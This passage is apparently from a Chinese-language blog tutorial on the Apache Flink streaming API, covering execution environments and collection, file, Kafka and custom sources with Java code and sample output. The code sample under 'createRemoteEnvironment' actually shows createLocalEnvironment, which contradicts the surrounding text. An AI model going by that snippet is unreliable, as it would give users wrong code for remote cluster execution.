class="headerlink" title="Flink流处理API"></a>Flink流处理API</h3><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h4><p><img src="https://img-blog.csdnimg.cn/20191124113558631.png###id=dVDF7&originHeight=113&originWidth=554&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="getExecutionEnvironment"><a href="#getExecutionEnvironment" class="headerlink" title="getExecutionEnvironment"></a>getExecutionEnvironment</h5><pre><code>创建一个执行环境，表示当前执行程序的上下文。如果程序是独立调用的，则此方法返回本地执行环境；如果从命令行客户端调用程序以提交到集群，则此方法返回此集群的执行环境，也就是说，getExecutionEnvironment会根据查询运行的方式决定返回什么样的运行环境，是最常用的一种创建执行环境的方式。</code></pre><p><code>ExecutionEnvironment env = ExecutionEnvironment.*getExecutionEnvironment*();</code></p><p><code>StreamExecutionEnvironment env = StreamExecutionEnvironment.*getExecutionEnvironment*();</code></p><p>如果没有设置并行度，会以flink-conf.yaml中的配置为准，默认是1。</p><p><img src="https://img-blog.csdnimg.cn/20191124113636435.png###id=PeCMw&originHeight=57&originWidth=554&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="createLocalEnvironment"><a href="#createLocalEnvironment" class="headerlink" title="createLocalEnvironment"></a>createLocalEnvironment</h5><pre><code>返回本地执行环境，需要在调用时指定默认的并行度。</code></pre><p><code>LocalStreamEnvironment env = StreamExecutionEnvironment.*createLocalEnvironment*(1);</code></p><h5 id="createRemoteEnvironment"><a href="#createRemoteEnvironment" class="headerlink" title="createRemoteEnvironment"></a>createRemoteEnvironment</h5><pre><code>返回集群执行环境，将Jar提交到远程服务器。需要在调用时指定JobManager的IP和端口号，并指定要在集群中运行的Jar包。</code></pre><p><code>StreamExecutionEnvironment env = StreamExecutionEnvironment.createLocalEnvironment(1);</code></p><h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106335725">Flink-Environment的三种方式和Source的四种读取方式-从集合中、从kafka中、从文件中、自定义</a></p></blockquote><h5 id="从集合读取数据"><a href="#从集合读取数据" class="headerlink" title="从集合读取数据"></a>从集合读取数据</h5><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:13 PM</span></span><br><span class="line"><span class="comment"> * 测试Flink从集合中获取数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest1_Collection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置env并行度1，使得整个任务抢占同一个线程执行</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Source: 从集合Collection中获取数据</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.fromCollection(</span><br><span class="line">                Arrays.asList(</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_1&quot;</span>, <span class="number">1547718199L</span>, <span class="number">35.8</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_6&quot;</span>, <span class="number">1547718201L</span>, <span class="number">15.4</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_7&quot;</span>, <span class="number">1547718202L</span>, <span class="number">6.7</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_10&quot;</span>, <span class="number">1547718205L</span>, <span class="number">38.1</span>)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Integer&gt; intStream = env.fromElements(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印输出</span></span><br><span class="line">        dataStream.print(<span class="string">&quot;SENSOR&quot;</span>);</span><br><span class="line">        intStream.print(<span class="string">&quot;INT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行</span></span><br><span class="line">        env.execute(<span class="string">&quot;JobName&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 1</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 3</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 5</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 6</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 7</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 8</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 9</span></span><br></pre></td></tr></table></figure><h5 id="从文件读取数据"><a href="#从文件读取数据" class="headerlink" title="从文件读取数据"></a>从文件读取数据</h5><p>java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:26 PM</span></span><br><span class="line"><span class="comment"> * Flink从文件中获取数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest2_File</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使得任务抢占同一个线程</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件中获取数据输出</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sensor.txt文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><h5 id="从Kafka读取数据"><a href="#从Kafka读取数据" class="headerlink" title="从Kafka读取数据"></a>从Kafka读取数据</h5><ol><li><p> pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 启动zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka服务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka生产者  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br></pre></td></tr></table></figure></li><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.serialization.SimpleStringSchema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaConsumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:44 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest3_Kafka</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置并行度1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        <span class="comment">// 下面这些次要参数</span></span><br><span class="line">        properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer-group&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// flink添加外部数据源</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.addSource(<span class="keyword">new</span> FlinkKafkaConsumer&lt;String&gt;(<span class="string">&quot;sensor&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(),properties));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印输出</span></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 运行java代码，在Kafka生产者console中输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br></pre></td></tr></table></figure></li></ol><h5 id="自定义Source"><a href="#自定义Source" class="headerlink" title="自定义Source"></a>自定义Source</h5><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 6:44 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest4_UDF</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> MySensorSource());</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现自定义的SourceFunction</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MySensorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 标示位，控制数据产生</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;SensorReading&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//定义一个随机数发生器</span></span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置10个传感器的初始温度</span></span><br><span class="line">            HashMap&lt;String, Double&gt; sensorTempMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">                sensorTempMap.put(<span class="string">&quot;sensor_&quot;</span> + (i + <span class="number">1</span>), <span class="number">60</span> + random.nextGaussian() * <span class="number">20</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (running) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String sensorId : sensorTempMap.keySet()) &#123;</span><br><span class="line">                    <span class="comment">// 在当前温度基础上随机波动</span></span><br><span class="line">                    Double newTemp = sensorTempMap.get(sensorId) + random.nextGaussian();</span><br><span class="line">                    sensorTempMap.put(sensorId, newTemp);</span><br><span class="line">                    ctx.collect(<span class="keyword">new</span> SensorReading(sensorId,System.currentTimeMillis(),newTemp));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 控制输出评率</span></span><br><span class="line">                Thread.sleep(<span class="number">2000L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.running = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 